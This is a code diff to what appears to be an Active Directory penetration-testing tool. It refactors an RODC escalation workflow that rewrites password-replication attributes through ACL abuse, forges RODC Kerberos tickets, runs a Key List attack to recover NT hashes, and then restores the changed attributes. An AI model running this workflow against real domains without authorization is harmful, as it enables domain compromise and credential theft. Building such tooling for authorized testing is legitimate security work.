@@ -70,6 +70,7 @@ from adscan_internal.services.exploitation.rodc_golden_ticket import (
 from adscan_internal.services.rodc_followup_planner import (
     resolve_rodc_krbtgt_key_plan,
 )
+from adscan_internal.models.domain import resolve_dc_ip
 
 
 _RODC_ALLOWED_GROUP = "Allowed RODC Password Replication Group"
@@ -102,51 +103,35 @@ def _normalize_attr_values(values: Iterable[str]) -> tuple[str, ...]:
     return tuple(normalized)
 
 
-def _parse_bloodyad_multi_value_output(output: str) -> dict[str, tuple[str, ...]]:
-    """Parse repeated ``key: value`` BloodyAD output lines into tuples."""
-    values: dict[str, list[str]] = {}
-    for raw_line in str(output or "").splitlines():
-        line = str(raw_line or "").strip()
-        if not line or ":" not in line:
-            continue
-        key, value = line.split(":", 1)
-        key_clean = key.strip()
-        value_clean = value.strip()
-        if not key_clean or not value_clean:
-            continue
-        values.setdefault(key_clean, []).append(value_clean)
-    return {
-        key: _normalize_attr_values(raw_values) for key, raw_values in values.items()
-    }
-
-
-def _normalize_rodc_prp_attribute_values(
-    parsed_values: dict[str, tuple[str, ...]],
+def _read_rodc_prp_attribute_values(
+    result_attributes: dict[str, str] | None,
     attribute_name: str,
 ) -> tuple[str, ...]:
-    """Return normalized PRP values even when BloodyAD emits one semicolon-joined line.
+    """Return normalized DN-valued PRP values from a native LDAP attribute snapshot.
 
-    ``bloodyAD get object`` may render DN-valued multi-attributes such as
-    ``msDS-NeverRevealGroup`` as a single line with entries separated by ``;``.
-    The follow-up restore path needs each DN as its own ``-v`` argument.
+    The native badldap backend (``ExploitationService.acl.get_object_attributes``)
+    returns ``result.attributes`` as a ``dict[str, str]`` where multi-valued
+    attributes are joined with ``\\n``.  This helper splits that representation
+    back into a tuple of DNs.  ``;`` is also accepted as a separator for
+    defensive parity with the legacy bloodyAD stdout format, so attribute
+    snapshots produced by older code paths still round-trip correctly.
     """
-    raw_values = parsed_values.get(attribute_name, ())
-    normalized: list[str] = []
-    seen: set[str] = set()
-    for raw_value in raw_values:
-        value = str(raw_value or "").strip()
-        if not value:
-            continue
-        parts = [part.strip() for part in value.split(";")]
-        for part in parts:
-            if not part:
-                continue
-            key = part.casefold()
-            if key in seen:
-                continue
-            seen.add(key)
-            normalized.append(part)
-    return tuple(normalized)
+    raw = ""
+    if result_attributes:
+        raw = str(
+            result_attributes.get(attribute_name)
+            or result_attributes.get(attribute_name.lower())
+            or ""
+        )
+    if not raw:
+        return ()
+    pieces: list[str] = []
+    for line in raw.splitlines():
+        for part in line.split(";"):
+            piece = part.strip()
+            if piece:
+                pieces.append(piece)
+    return _normalize_attr_values(pieces)
 
 
 def _resolve_workspace_dir(shell: Any) -> str:
@@ -178,6 +163,28 @@ def _build_rodc_target_candidates(domain: str, machine_account: str) -> tuple[st
     if stem and domain_clean:
         candidates.append(f"{stem}.{domain_clean}")
     return tuple(candidate for candidate in candidates if str(candidate or "").strip())
+
+
+def _probe_first_reachable_host(
+    candidates: tuple[str, ...],
+    ports: tuple[int, ...],
+    *,
+    timeout: float = 3.0,
+) -> str | None:
+    """Return the first candidate hostname reachable on any of *ports*, or ``None``."""
+    from adscan_internal.services.async_bridge import run_async_sync  # noqa: PLC0415
+    from adscan_internal.services.network_probe_service import tcp_probe_multi  # noqa: PLC0415
+
+    fqdns = [c for c in candidates if "." in c]
+    short = [c for c in candidates if "." not in c]
+    for host in fqdns + short:
+        try:
+            result = run_async_sync(tcp_probe_multi(host, list(ports), timeout=timeout))
+            if result.status == "open":
+                return host
+        except Exception:  # noqa: BLE001
+            continue
+    return None
 
 
 def _normalize_graph_principal_label(value: str) -> str:
@@ -439,7 +446,11 @@ def _assess_rodc_object_control(
         target_label=target_label,
         max_depth=8,
         max_paths=None,
-        target_mode="tier0",
+        # "object" mode preserves the owned-user source through chained
+        # MemberOf+ACL paths (e.g. L.WILSON_ADM → TIER 1 → AddSelf → RODC
+        # ADMINS → ManageRODCPrp → RODC01) and keeps the shorter path to the
+        # specific target even when a longer extension exists in the graph.
+        target_mode="object",
         engine_override="local",
         dev_workers_override=0,
         render_debug_tables=False,
@@ -600,6 +611,12 @@ def _maybe_select_ready_rodc_object_control_path(
         return object_control
 
     from adscan_internal.cli.attack_path_execution import print_attack_paths_summary
+    from adscan_internal.rich_output import order_attack_paths_for_display
+
+    # Apply the canonical UX ordering once so the table renderer and the
+    # selector prompt below share the same indexable list.
+    ready_paths = order_attack_paths_for_display(ready_paths)
+    prerequisite_paths = order_attack_paths_for_display(prerequisite_paths)
 
     print_panel(
         "\n".join(
@@ -742,7 +759,7 @@ def _maybe_select_ready_rodc_object_control_path(
             recompute_summaries=_recompute_prerequisite_summaries,
             snapshot_scope="owned",
             snapshot_target="all",
-            snapshot_target_mode="tier0",
+            snapshot_target_mode="object",
         )
         if not executed:
             print_info(
@@ -835,7 +852,6 @@ def _refresh_rodc_prp_control_edges(
                 ),
                 log_creation=False,
                 shell=shell,
-                force_opengraph=True,
             )
             or 0
         )
@@ -1131,7 +1147,7 @@ def _maybe_execute_rodc_object_control_prerequisites(
         recompute_summaries=_recompute_prerequisite_summaries,
         snapshot_scope="owned",
         snapshot_target="all",
-        snapshot_target_mode="tier0",
+        snapshot_target_mode="object",
     )
     if not executed:
         print_info(
@@ -1175,10 +1191,29 @@ def _assess_rodc_host_followup_access(
     marked_machine = mark_sensitive(machine_account, "user")
     marked_domain = mark_sensitive(domain, "domain")
     if not resolution.report_available:
-        print_warning(
-            f"RODC follow-up for {marked_machine}@{marked_domain} requires a current-vantage reachability report first."
+        # No persisted report — fall back to a live TCP probe so that RODC
+        # follow-up is not permanently blocked in environments where the
+        # reachability scan was never run or is stale.
+        probe_candidates = _build_rodc_target_candidates(domain, normalized_machine)
+        live_host = _probe_first_reachable_host(probe_candidates, _RODC_REQUIRED_ACCESS_PORTS)
+        if live_host is None:
+            print_warning(
+                f"RODC follow-up for {marked_machine}@{marked_domain} is blocked: "
+                "no reachability report available and the host did not respond to a live probe."
+            )
+            return None
+        print_info_debug(
+            f"[rodc] no reachability report; live probe confirmed {mark_sensitive(live_host, 'hostname')} is reachable"
         )
-        return None
+        return CurrentVantageTargetAssessment(
+            requested_target=live_host,
+            matched=True,
+            reachable=True,
+            matched_ips=(),
+            matched_hostnames=(live_host,),
+            open_ports=(),
+            status="live_probe",
+        )
 
     assessment = next(iter(resolution.reachable_targets), None)
     if assessment is None:
@@ -1223,7 +1258,6 @@ def _resolve_object_dn(
     service: ExploitationService,
     *,
     pdc_host: str,
-    bloody_path: str,
     domain: str,
     username: str,
     password: str,
@@ -1232,7 +1266,6 @@ def _resolve_object_dn(
     """Resolve one object's distinguished name via BloodyAD."""
     result = service.acl.get_object_attributes(
         pdc_host=pdc_host,
-        bloody_path=bloody_path,
         domain=domain,
         username=username,
         password=password,
@@ -1256,7 +1289,6 @@ def _load_rodc_attribute_state(
     service: ExploitationService,
     *,
     pdc_host: str,
-    bloody_path: str,
     domain: str,
     username: str,
     password: str,
@@ -1265,7 +1297,6 @@ def _load_rodc_attribute_state(
     """Return current RODC DN, RevealOnDemand values, and NeverReveal values."""
     result = service.acl.get_object_attributes(
         pdc_host=pdc_host,
-        bloody_path=bloody_path,
         domain=domain,
         username=username,
         password=password,
@@ -1279,20 +1310,20 @@ def _load_rodc_attribute_state(
     )
     if not result.success:
         return None, (), ()
-    parsed = _parse_bloodyad_multi_value_output(result.raw_output or "")
+    attributes = result.attributes or {}
     rodc_dn = (
         str(
-            result.attributes.get("distinguishedName")
-            or result.attributes.get("distinguishedname")
+            attributes.get("distinguishedName")
+            or attributes.get("distinguishedname")
             or ""
         ).strip()
         or None
     )
-    reveal_values = _normalize_rodc_prp_attribute_values(
-        parsed, "msDS-RevealOnDemandGroup"
+    reveal_values = _read_rodc_prp_attribute_values(
+        attributes, "msDS-RevealOnDemandGroup"
     )
-    never_reveal_values = _normalize_rodc_prp_attribute_values(
-        parsed, "msDS-NeverRevealGroup"
+    never_reveal_values = _read_rodc_prp_attribute_values(
+        attributes, "msDS-NeverRevealGroup"
     )
     return rodc_dn, reveal_values, never_reveal_values
 
@@ -1301,42 +1332,60 @@ def _restore_rodc_attribute_state(
     service: ExploitationService,
     *,
     pdc_host: str,
-    bloody_path: str,
     domain: str,
     username: str,
     password: str,
     target_object: str,
-    reveal_values: tuple[str, ...],
-    never_reveal_values: tuple[str, ...],
+    reveal_values: tuple[str, ...] | None,
+    never_reveal_values: tuple[str, ...] | None,
 ) -> bool:
-    """Restore the RODC password-replication attributes to their original state."""
-    reveal_restore = service.acl.set_object_attribute_values(
-        pdc_host=pdc_host,
-        bloody_path=bloody_path,
-        domain=domain,
-        username=username,
-        password=password,
-        target_object=target_object,
-        attribute_name="msDS-RevealOnDemandGroup",
-        attribute_values=reveal_values,
-        kerberos=True,
-    )
-    never_reveal_restore = service.acl.set_object_attribute_values(
-        pdc_host=pdc_host,
-        bloody_path=bloody_path,
-        domain=domain,
-        username=username,
-        password=password,
-        target_object=target_object,
-        attribute_name="msDS-NeverRevealGroup",
-        attribute_values=never_reveal_values,
-        kerberos=True,
-    )
-    return bool(reveal_restore.success and never_reveal_restore.success)
+    """Restore the RODC password-replication attributes to their original state.
+
+    Each ``*_values`` parameter accepts ``None`` to mean "the modify path did
+    not touch this attribute, so do not write to it during cleanup".  This is
+    critical: blindly writing an empty tuple here would clear an attribute we
+    never modified (e.g. when the original snapshot read failed, or when
+    ``msDS-NeverRevealGroup`` was deliberately left untouched because it was
+    already empty).  An empty ``()`` is a legitimate restore target and means
+    "the original state was empty — clear the attribute".
+    """
+    successes: list[bool] = []
+    if reveal_values is not None:
+        reveal_restore = service.acl.set_object_attribute_values(
+            pdc_host=pdc_host,
+            domain=domain,
+            username=username,
+            password=password,
+            target_object=target_object,
+            attribute_name="msDS-RevealOnDemandGroup",
+            attribute_values=reveal_values,
+            kerberos=True,
+        )
+        successes.append(bool(reveal_restore.success))
+    if never_reveal_values is not None:
+        never_reveal_restore = service.acl.set_object_attribute_values(
+            pdc_host=pdc_host,
+            domain=domain,
+            username=username,
+            password=password,
+            target_object=target_object,
+            attribute_name="msDS-NeverRevealGroup",
+            attribute_values=never_reveal_values,
+            kerberos=True,
+        )
+        successes.append(bool(never_reveal_restore.success))
+    return all(successes) if successes else True
 
 
-def _format_rodc_restore_values(values: tuple[str, ...]) -> str:
-    """Render original LDAP attribute values for operator-facing cleanup guidance."""
+def _format_rodc_restore_values(values: tuple[str, ...] | None) -> str:
+    """Render original LDAP attribute values for operator-facing cleanup guidance.
+
+    ``None`` means the attribute was never modified by this run, so the
+    operator does not need to restore it.  An empty tuple means the original
+    state was empty (the attribute should be cleared).
+    """
+    if values is None:
+        return "(this attribute was not modified — no action needed)"
     if not values:
         return "(clear this attribute)"
     return "\n".join(f"- {mark_sensitive(value, 'path')}" for value in values)
@@ -1346,8 +1395,8 @@ def _print_rodc_cleanup_manual_guidance(
     *,
     domain: str,
     rodc_machine: str,
-    reveal_values: tuple[str, ...],
-    never_reveal_values: tuple[str, ...],
+    reveal_values: tuple[str, ...] | None,
+    never_reveal_values: tuple[str, ...] | None,
 ) -> None:
     """Show actionable manual cleanup guidance when automatic restore fails."""
     marked_domain = mark_sensitive(domain, "domain")
@@ -1710,18 +1759,15 @@ def _maybe_run_rodc_key_list_after_prp(
     domain_data = getattr(shell, "domains_data", {}).get(domain, {})
     dc_ip = ""
     if isinstance(domain_data, dict):
-        dc_ip = str(domain_data.get("dc_ip") or "").strip()
+        dc_ip = resolve_dc_ip(domain_data) or ""
     request = KerberosKeyListRequest(
         domain=domain,
         kdc_host=kdc_host,
         rodc_number=rodc_number,
         rodc_aes_key=rodc_aes_key,
         targets=(target_user,),
-        ccache_path=ticket_path,
-        use_kerberos=True,
+        forged_ticket_ccache=ticket_path,
         dc_ip=dc_ip or None,
-        impacket_scripts_dir=str(getattr(shell, "impacket_scripts_dir", "") or "").strip()
-        or None,
     )
 
     with active_step_followup(
@@ -1729,10 +1775,7 @@ def _maybe_run_rodc_key_list_after_prp(
         source="rodc_prp_transaction",
         title="Run Kerberos Key List",
     ):
-        outcome = KerberosKeyListService().run(
-            request,
-            run_command=getattr(shell, "run_command", None),
-        )
+        outcome = KerberosKeyListService().run(request)
 
     if outcome.raw_output:
         output_path = _save_rodc_key_list_output(
@@ -1760,6 +1803,7 @@ def _maybe_run_rodc_key_list_after_prp(
                 credential.domain.lower(),
                 credential.username,
                 credential.nt_hash,
+                credential_origin="rodc_key_list",
             )
 
     recovered = ", ".join(
@@ -1845,11 +1889,17 @@ def offer_rodc_escalation(
         label="rodc_followup",
         domain=domain,
     )
-    original_reveal_values: tuple[str, ...] = ()
-    original_never_reveal_values: tuple[str, ...] = ()
+    # Snapshots are ``None`` until the original RODC attribute state is read
+    # successfully.  Cleanup only writes to attributes whose snapshot is not
+    # ``None`` *and* that we actually modified — see ``wrote_reveal`` /
+    # ``cleared_never_reveal`` flags below.  ``None`` here is the safe default
+    # because if the snapshot read fails before we modify anything, the
+    # ``finally`` block must not wipe the live attributes.
+    original_reveal_values: tuple[str, ...] | None = None
+    original_never_reveal_values: tuple[str, ...] | None = None
+    wrote_reveal = False
     service: ExploitationService | None = None
     pdc_host = ""
-    bloody_path = ""
     normalized_machine = normalize_machine_account(rodc_machine or username)
     policy_username = username
     policy_password = password
@@ -1977,15 +2027,29 @@ def offer_rodc_escalation(
         )
 
         domain_data = getattr(shell, "domains_data", {}).get(domain, {})
+        # ``pdc_host`` serves as BOTH the KDC address (for Kerberos TGS
+        # requests) AND the base for the Kerberos SPN target hostname
+        # (ldap/dc01.garfield.htb@GARFIELD.HTB).  ADscanLDAPConfig.__post_init__
+        # now normalises it automatically: bare labels like "dc01" are promoted
+        # to "dc01.garfield.htb" before any transport layer sees them.
+        #
+        # Priority:
+        #   pdc_hostname_fqdn — explicit FQDN, use as-is
+        #   pdc_hostname      — bare label, __post_init__ promotes to FQDN
+        #   resolve_dc_ip     — IP only (works for KDC but NOT for Kerberos SPN
+        #                       target; __post_init__ leaves IPs unchanged)
+        #
+        # Do NOT use resolve_dc_ip() first: an IP-only pdc_host prevents
+        # _build_native_ldap_config from deriving kerberos_target_hostname, which
+        # causes "LDAP Kerberos requires a DC FQDN for the service SPN".
         pdc_host = str(
             domain_data.get("pdc_hostname_fqdn")
             or domain_data.get("pdc_hostname")
-            or domain_data.get("pdc")
+            or resolve_dc_ip(domain_data or {})
             or ""
         ).strip()
-        bloody_path = str(getattr(shell, "bloodyad_path", "") or "").strip()
-        if not pdc_host or not bloody_path:
-            print_error("RODC follow-up requires a reachable DC and bloodyAD.")
+        if not pdc_host:
+            print_error("RODC follow-up requires a reachable DC.")
             return False
 
         default_target_user = str(
@@ -2089,7 +2153,6 @@ def offer_rodc_escalation(
         target_user_dn = _resolve_object_dn(
             service,
             pdc_host=pdc_host,
-            bloody_path=bloody_path,
             domain=domain,
             username=policy_username,
             password=policy_password,
@@ -2104,7 +2167,6 @@ def offer_rodc_escalation(
         allowed_group_dn = _resolve_object_dn(
             service,
             pdc_host=pdc_host,
-            bloody_path=bloody_path,
             domain=domain,
             username=policy_username,
             password=policy_password,
@@ -2122,7 +2184,6 @@ def offer_rodc_escalation(
         rodc_dn, reveal_values, never_reveal_values = _load_rodc_attribute_state(
             service,
             pdc_host=pdc_host,
-            bloody_path=bloody_path,
             domain=domain,
             username=policy_username,
             password=policy_password,
@@ -2178,9 +2239,27 @@ def offer_rodc_escalation(
                     "attribute_values": updated_reveal_values,
                 },
             )
+            # Build a CredentialContext so the LDAP transport refreshes the TGT
+            # before bind.  policy_username (e.g. l.wilson_adm) just joined
+            # RODC Administrators via AddSelf in a prior step — its existing TGT
+            # carries a stale PAC that does NOT include the new group
+            # membership, so a direct LDAP modify against msDS-RevealOnDemandGroup
+            # would return insufficientAccessRights even though the live group
+            # membership grants ManageRODCPrp.  The credential context detects
+            # the registry invalidation emitted by the AddSelf step and re-mints
+            # the TGT transparently inside async_connect_with_ldap_fallback.
+            from adscan_internal.cli.exploits import _build_executor_credential_context
+
+            policy_credential_context = _build_executor_credential_context(
+                shell=shell,
+                domain=domain,
+                username=policy_username,
+                password=policy_password,
+                ccache=None,
+            )
+
             reveal_update = service.acl.set_object_attribute_values(
                 pdc_host=pdc_host,
-                bloody_path=bloody_path,
                 domain=domain,
                 username=policy_username,
                 password=policy_password,
@@ -2188,6 +2267,7 @@ def offer_rodc_escalation(
                 attribute_name="msDS-RevealOnDemandGroup",
                 attribute_values=updated_reveal_values,
                 kerberos=True,
+                credential_context=policy_credential_context,
             )
             if not reveal_update.success:
                 update_edge_status_by_labels(
@@ -2220,11 +2300,11 @@ def offer_rodc_escalation(
                 )
                 return False
             cleanup_required = True
+            wrote_reveal = True
 
             if never_reveal_values:
                 never_reveal_update = service.acl.set_object_attribute_values(
                     pdc_host=pdc_host,
-                    bloody_path=bloody_path,
                     domain=domain,
                     username=policy_username,
                     password=policy_password,
@@ -2232,6 +2312,7 @@ def offer_rodc_escalation(
                     attribute_name="msDS-NeverRevealGroup",
                     attribute_values=(),
                     kerberos=True,
+                    credential_context=policy_credential_context,
                 )
                 if not never_reveal_update.success:
                     update_edge_status_by_labels(
@@ -2264,6 +2345,54 @@ def offer_rodc_escalation(
                     )
                     return False
                 cleared_never_reveal = True
+
+            # Read the live PRP state back from AD so the operator can verify
+            # the modify actually landed before Key List runs.  Printed under
+            # DEBUG so it shows in --verbose / --debug only, and uses the same
+            # policy credentials that just succeeded so we know they bind.
+            try:
+                _readback_dn, readback_reveal, readback_never_reveal = (
+                    _load_rodc_attribute_state(
+                        service,
+                        pdc_host=pdc_host,
+                        domain=domain,
+                        username=policy_username,
+                        password=policy_password,
+                        target_object=normalized_machine,
+                    )
+                )
+                marked_reveal = (
+                    ", ".join(mark_sensitive(v, "path") for v in readback_reveal)
+                    if readback_reveal
+                    else "(empty)"
+                )
+                marked_never = (
+                    ", ".join(mark_sensitive(v, "path") for v in readback_never_reveal)
+                    if readback_never_reveal
+                    else "(empty)"
+                )
+                print_info_debug(
+                    f"[rodc][prp-readback] msDS-RevealOnDemandGroup -> {marked_reveal}"
+                )
+                print_info_debug(
+                    f"[rodc][prp-readback] msDS-NeverRevealGroup    -> {marked_never}"
+                )
+                target_user_dn_clean = str(target_user_dn or "").strip().casefold()
+                target_in_reveal = any(
+                    str(v or "").strip().casefold() == target_user_dn_clean
+                    for v in readback_reveal
+                )
+                if target_user_dn_clean and not target_in_reveal:
+                    print_warning(
+                        "Target user DN was not found in msDS-RevealOnDemandGroup after the modify; "
+                        "Key List will likely fail. Re-check the RODC object state in AD."
+                    )
+            except Exception as exc:  # noqa: BLE001
+                telemetry.capture_exception(exc)
+                print_info_debug(
+                    f"[rodc][prp-readback] failed to re-read RODC PRP state: "
+                    f"{type(exc).__name__}: {exc}"
+                )
 
             update_active_step_status(
                 shell,
@@ -2341,17 +2470,28 @@ def offer_rodc_escalation(
         print_info_debug(f"[rodc] escalation helper failed: {exc}")
         return False
     finally:
-        if cleanup_required and service is not None and pdc_host and bloody_path:
+        if cleanup_required and service is not None and pdc_host:
+            # Only restore attributes we actually wrote to.  ``wrote_reveal``
+            # and ``cleared_never_reveal`` track what the modify path touched;
+            # passing ``None`` for attributes we never modified prevents the
+            # rollback from wiping live values when the original snapshot was
+            # never captured (or when the attribute was deliberately left
+            # alone because it was already in the desired state).
+            reveal_restore_values: tuple[str, ...] | None = (
+                original_reveal_values if wrote_reveal else None
+            )
+            never_reveal_restore_values: tuple[str, ...] | None = (
+                original_never_reveal_values if cleared_never_reveal else None
+            )
             cleanup_completed = _restore_rodc_attribute_state(
                 service,
                 pdc_host=pdc_host,
-                bloody_path=bloody_path,
                 domain=domain,
                 username=policy_username,
                 password=policy_password,
                 target_object=normalized_machine,
-                reveal_values=original_reveal_values,
-                never_reveal_values=original_never_reveal_values,
+                reveal_values=reveal_restore_values,
+                never_reveal_values=never_reveal_restore_values,
             )
             marked_rodc = mark_sensitive(normalized_machine, "user")
             marked_domain = mark_sensitive(domain, "domain")
@@ -2381,8 +2521,8 @@ def offer_rodc_escalation(
                 _print_rodc_cleanup_manual_guidance(
                     domain=domain,
                     rodc_machine=normalized_machine,
-                    reveal_values=original_reveal_values,
-                    never_reveal_values=original_never_reveal_values,
+                    reveal_values=reveal_restore_values,
+                    never_reveal_values=never_reveal_restore_values,
                 )
                 try:
                     _print_rodc_prp_next_steps(
